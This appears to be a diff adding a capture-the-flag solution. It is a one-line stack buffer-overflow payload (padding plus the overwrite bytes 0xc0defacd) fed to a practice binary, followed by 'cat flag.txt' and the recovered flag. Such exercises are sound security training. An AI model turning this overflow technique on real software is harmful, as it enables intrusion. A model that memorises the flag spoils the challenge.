@@ -1,0 +1,4 @@
+./overflow1 $(echo $(python -c "print 'aaaaaaaaaaaaaaaa\xce\xfa\xde\xc0'"))
+
+cat flag.txt
+ooh_so_critical
